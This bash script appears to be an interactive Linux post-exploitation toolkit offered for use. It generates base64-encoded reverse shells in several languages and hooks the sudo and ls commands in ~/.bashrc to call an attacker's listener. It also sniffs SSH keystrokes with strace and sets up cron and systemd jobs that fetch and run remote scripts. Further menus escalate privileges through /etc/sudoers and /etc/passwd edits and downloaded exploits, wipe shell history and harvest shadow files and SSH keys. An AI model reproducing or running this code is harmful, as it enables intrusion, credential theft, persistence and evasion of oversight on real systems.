#!/bin/bash

declare -A dispatch_table
declare -a options
filename=.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)

payloads=(
"nc -e /bin/bash address prt"
"bash -i >& /dev/tcp/address/prt 0>&1"
"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"address\",prt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
"curl -fsSL 'address' | sh"
)

display_output(){
	local h=${1-10}
	local w=${2-41}
	local t=${3-Output}
	dialog --title "${t}" --clear --msgbox "$(<$OUTPUT)" ${h} ${w}
}

function ctrl_c() {
	clear
	return
}

prompt(){
	local PS3="$1: "
	local -n _options=$2 _dispatch=$3
	select opt in "${_options[@]}"; do
		if [[ -v _dispatch["$opt"] ]]; then
		"${_dispatch[$opt]}"
		break
		fi
		done
}

enter(){
	echo -e "\n"
	read -p "Press 'Enter' to continue"
}

encshell(){
	echo -e "Enter listener server address and port\n"
	read -r -p "Address: " address
	read -r -p "Port: " port
	shell="${shell/'address'/$address}"
	shell="${shell/'prt'/$port}"
	encode=$(echo $shell | base64)
}


genpayload(){
	create(){
		sel=$REPLY
		shell=${payloads[$sel-1]}
		encshell
		echo "nohup echo \"${encode}\" | base64 -d | bash" > .shell.sh
		chmod +x .shell.sh
		echo -e "Payload saved as `pwd`/.shell.sh"
		enter
	}

	options=( "Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell"  "Return to main menu")
	dispatch_table=(
		["Reverse Netcat Shell"]=create
		["Reverse Bash Shell"]=create
		["Reverse Python Shell"]=create
		["Reverse PHP Shell"]=create
		["Reverse Ruby Shell"]=create
		["Reverse Perl Shell"]=create
		["Return to main menu"]=return
	)
	prompt "Select Reverse Shell payload" options dispatch_table
}


sudowrap(){
	cat <<-EOF
		-- sudo command injection wrapper --
		*******
		WARNING
		*******
		This function wraps this system's sudo command with a function that runs a root netcat reverse shell when 'sudo' is run in terminal
		for privilege escalation. (If this user is added to /etc/sudoers)
		Wait for your target to log in and run sudo and you will receive a reverse root shell.
		EOF

	read -p "enter (continue/exit) or press enter to return to menu: " ce
	case $ce in
		[CONTINUEcontinue]* )
			shell=${payloads[0]}
			echo -e "Enter listener server address and port\n"
			read -r -p "Address: " address
			read -r -p "Port: " port
			shell="${shell/'address'/$address}"
			shell="${shell/'prt'/$port}"
			echo -e "function sudo(){ \n(sudo ${shell} > /dev/null 2>.1 &)\n /usr/bin/sudo \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 \n}" > $HOME/.sudo
			echo "source ~/.sudo" >> ~/.bashrc
			echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
			enter;;
		[Exitexit]* ) return;;
	esac
}


lswrap(){
	cat <<-EOF
		--ls command payload injection wrapper--
		*******
		WARNING
		*******
		This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal
		EOF

	read -p "enter (continue/exit) or press enter to return to menu: " ce
	case $ce in
		[CONTINUEcontinue]* )
			shell=${payloads[0]}
			encshell
			echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
			echo "source ~/.ls" >> ~/.bashrc
			echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
			enter;;
		[Exitexit]* ) return;;
	esac
}

keyinject(){
	if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_TTY" ]; then
		echo "SSH processes:"
		ps aux | grep sshd | awk '{ print "ID: "$2" - "$11" "$12"\n" }' | grep -v 'grep\|sbin'
		read -r -p "Enter SSH process ID to be injected: " PID
		echo -e "Press ctrl+c to exit"
		trap ctrl_c INT
		strace -e trace=read -fp ${PID} 2>&1 | awk -F, '! /\\/ {print $2}'
	else
		echo "No SSH processes are currently running"
		enter
	fi
}


cron(){
	read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
	read -r -p "Would you like to use wget to download/execute or curl to download/execute in memory for cronjob?: " wc
	case $wc in
		[WGETwget]* )
			cronjob="* * * * * wget -O- $server | sh";;
		[CURLcurl]* )
			cronjob="* * * * * curl -fsSL '$server' | sh";;
	esac
	clear


	cmmand(){
		echo "( crontab -l | grep -v -F \"$server\" ; echo \"$cronjob\" ) | crontab -" > command.txt
		echo -e "\ncommand saved as command.txt\n"
		echo "command:"
		cat command.txt
		enter
	}


	add2sys(){
		( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
		echo -e "\nAdded cron job to crontab"
		enter
	}

	options=("Echo generated crontab command to download and execute payload every minute" "Add cron job to this system to download and execute payload every minute" "Return to main menu")
	dispatch_table=(
		["Echo generated crontab command to download and execute payload every minute"]=cmmand
		["Add cron job to this system to download and execute payload every minute"]=add2sys
		["Return to main menu"]=return
		)

	prompt "Generate cron job payload dropper command or add cron job to this machine" options dispatch_table
}

systimer(){
	echo -e "This function creates a systemd timer to download and execute payload"
	read -r -p "Enter your server IP/address hosting script (example: https://www.server.com/script.sh): " server
	sysdir=/etc/systemd/system/

	build=(
	"wget -O- ${server} | sh"
	"[Unit]\nDescription=${filename}\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/bash ${sysdir}${filename}"
	"[Unit]\nDescription=${filename}\n\n[Timer]\nOnUnitActiveSec=10s\nOnBootSec=10s\n\n[Install]\nWantedBy=timers.target\n"
	)

	filenames=(
	"${filename}" 
	"${filename}.service"
	"${filename}.timer"
	)

	for timer in "${!build[@]}"
		do
		echo -e ${build[timer]} > ${sysdir}${filenames[timer]}
	done
	systemctl daemon-reload
	systemctl start ${filename}.timer	
}


escalate(){
	direct=/tmp/${filename}

	conmethods(){
		cat <<-EOF
			This function attempts to:
			*write "$USER ALL=(ALL) NOPASSWD: ALL" to /etc/sudoers
			*make every user root
			*read doas config
			*exploit docker bash container exploit*
			*Attempt to find suid
			*get last edited files
			*list all capabilities
			EOF

		enter

		declare -a methods=(
		"echo '$USER ALL=(ALL) NOPASSWD: ALL' >>/etc/sudoers"
		"sed -i -e 's/x:1000:1000:/x:0:0:/g' /etc/passwd"
		"cat /etc/doas.conf"
		"docker run -it --rm -v $PWD:/mnt bash echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd >2/dev/null"
		"find / -perm 4000 2>/dev/null"
		"find / -mmin -10 2>/dev/null | grep -Ev '^/proc'"
		"getcap -r / 2>/dev/null"
		)

		for method in "${!methods[@]}"
			do
			$? 2>/dev/null
			eval "${methods[method]}"
			if (("$?" == 0)); then
				echo -e "${methods[method]}"
				echo -e "[*] Method Succeded [*]\n"
				sleep 1
			else
				echo -e "[*] Method Failed! [*]\n"
			fi
		done
	}


	search(){
		echo -e '*Searching for password in memory'
		strings /dev/mem -n10 | grep -i PASS
		echo -e '*Searching for password using find'
		find . -type f -exec grep -i -I "PASSWORD" {{}} /dev/null \;
		echo -e '*Searcing for password using grep'
		grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
		enter
		clear
		return
	}

	downld(){
		clear
		wget -q -P ${direct} $1
		chmod -R +x ${direct}

		if echo $1 | grep .py; then
			python ${direct}/./*
		elif echo $1 | grep .sh; then
			${direct}/./*
		elif echo $1 | grep .zip; then
			unzip -q ${direct}/master.zip -d ${direct}/zip
		else :
		fi
	}

	dirty(){
		downld https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
		gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
		${direct}/./dirty
	}


	linprivesc(){
		downld https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
	}


	exploitsug(){
		downld https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
	}


	lineum(){
		downld https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
	}
	
	mimipeng(){
		if uname -a | grep "i386\|i686"; then
				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin_x32
		else
				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin
		fi
		echo "Mimipenguin: A tool to dump the login/password from the current linux desktop user.."
		echo "If the screen is blank mimipenguin did not find anything..."
		${direct}/./mimipenguin*
	}

	
	sudokill(){
		downld https://github.com/TH3xACE/SUDO_KILLER/archive/master.zip
		${direct}/zip/*/./SUDO_KILLERv*
	}


	Orc(){
		downld https://github.com/zMarch/Orc/archive/master.zip
		cat <<-EOF
			Dropping into Orc shell!
			Check https://github.com/zMarch/Orc for commands and usage.
			EOF

		ENV=${direct}/zip/Orc-master/o.rc sh -i
	}

	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run mimipenguin" "Download and run SUDO KILLER" "Download and run Orc" "Return to main menu")
	dispatch_table=(
		["Try conventional methods to escalate privileges"]=conmethods
		["Search for password in this system"]=search
		["Download and run dirty cow exploit"]=dirty
		["Download and run linuxprivchecker.py"]=linprivesc
		["Download and run linux exploit suggester"]=exploitsug
		["Download and run LinEnum"]=lineum
		["Download and run mimipenguin"]=mimipeng
		["Download and run SUDO KILLER"]=sudokill
		["Download and run Orc"]=Orc
		["Return to main menu"]=return
		)

	prompt "How would you like to get root?" options dispatch_table
	
	rm -rf ${direct}

	if [ "$REPLY" -ge 1 -a "$REPLY" -le 7 ]; then
		enter
	else
		return
	fi
}


clearlog(){
	export HISTFILE=
	unset HISTFILE
	rm -rf ~/.bash_history
	touch ~/.bash_history
	unset HISTFILE HISTSIZE
	set history=0
	set +o history
	unset HISTFILE
	find / -type f -exec {}
	echo "Logs cleared!"
	sleep 1.5
}


info(){
	declare -a commands=(
	"hostname -f"
	"ip addr show"
	"ip ro show"
	"ifconfig -a"
	"route -n"
	"cat /etc/network/interfaces"
	"iptables -L -n -v"
	"iptables -t nat -L -n -v"
	"ip6tables -L -n -v"
	"iptables-save"
	"netstat -anop"
	"netstat -r"
	"netstat -nltupw"
	"arp -a"
	"lsof -nPi"
	"cat /proc/net/"
	"ls -alh /home/*/"
	"ls -alh /home/*/.ssh/"
	"cat /home/*/.ssh/authorized_keys"
	"cat /home/*/.ssh/known_hosts"
	"cat /home/*/.hist"
	"find /home/*/.vnc /home/*/.subversion -type f"
	"grep ^ssh /home/*/.hist"
	"grep ^telnet /home/*/.hist"
	"grep ^mysql /home/*/.hist"
	"cat /home/*/.viminfo"
	"crontab -l"
	"cat /home/*/.mysql_history"
	"/home/*/.ssh/id*"
	"/tmp/krb5cc_*"
	"/tmp/krb5.keytab"
	"/home/*/.gnupg/secring.gpgs"
	"ls -aRl /etc/ * awk '$1 ~ /w.$/' * grep -v lrwx 2>/dev/nullte"
	"cat /etc/issue{,.net}"
	"cat /etc/master.passwd"
	"cat /etc/group"
	"cat /etc/hosts"
	"cat /etc/crontab"
	"cat /etc/sysctl.conf"
	"for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l;"
	"cat /etc/resolv.conf"
	"ls -alh /root/"
	"cat /etc/sudoers"
	"cat /etc/shadow"
	"cat /etc/master.passwd"
	"cat /var/spool/cron/crontabs/* | cat /var/spool/cron/*"
	"lsof -nPi"
	"ls /home/*/.ssh/*"
	)

	for command in "${!commands[@]}"
		do
		$? 2>/dev/null
		eval "${commands[command]}"
		echo -e "\n\nRunning '${commands[command]}'\n"
		sleep 1
	done
	enter
}


checkVM(){
	if cat /proc/cpuinfo | grep -q "hypervisor"; then
		echo -e "This system is a virtual machine\n"
	else
		echo -e "This system is not a virtual Machine\n"
	fi
	enter
}


memoryexec(){
	memexc=${payloads[6]}
	read -r -p "Enter server IP address/host hosting bash script (example: http://server.com/shell.sh): " server
	memexc="${memexc/'address'/$server}"
	eval "$memexc"
	echo -e "\nExecution of ${script} in memory completed!"
	enter
}


banip(){
	sleep 1
	echo -e '\nConnected IP Addresses:'
	netstat -anpt | grep ESTABLISHED | awk '{ print $5 }' | cut -d: -f1 | sort -u
	echo -e '\nIP Addresses connected via SSH:'
	netstat -tnpa | grep 'ESTABLISHED.*sshd' | awk '{ print $5 }' | cut -d: -f1 | sort -u
	echo -e '\nCurrent activity on this system:\n'
	w
	echo -e "\nDo you want to ban an address or return to menu?" 
	read -p 'enter (ban/exit) or press enter to return to menu: ' bs
	case $bs in
		[Banban]* ) 
			read -r -p  'Enter IP to be banned: ' address; iptables -A INPUT -s $address -j DROP;;
		[Exitexit]* ) return;;
	esac
}


while true
do
clear
options=( "Generate Reverse Shells" "Inject 'sudo' to run payload as root" "Inject 'ls' with payload" 
"Read ssh process keystrokes" "Add cron job for persistence" "Create systemd timer for persistence" 
"Escalate privileges" "Clear all logs" "Gain recon on the system" "Check if system is a virtual machine" "Ban an IP address" "Exit")
dispatch_table=(
	["Generate Reverse Shells"]=genpayload
	["Inject 'sudo' to run payload as root"]=sudowrap
	["Inject 'ls' with payload"]=lswrap
	["Read ssh process keystrokes"]=keyinject
	["Add cron job for persistence"]=cron
	["Create systemd timer for persistence"]=systimer
	["Escalate privileges"]=escalate
	["Clear all logs"]=clearlog
	["Gain recon on the system"]=info
	["Check if system is a virtual machine"]=checkVM
	["Execute bash script in memory"]=memoryexec
	["Ban an IP address"]=banip
	["Exit"]=exit
	)
prompt "Choose option" options dispatch_table

done
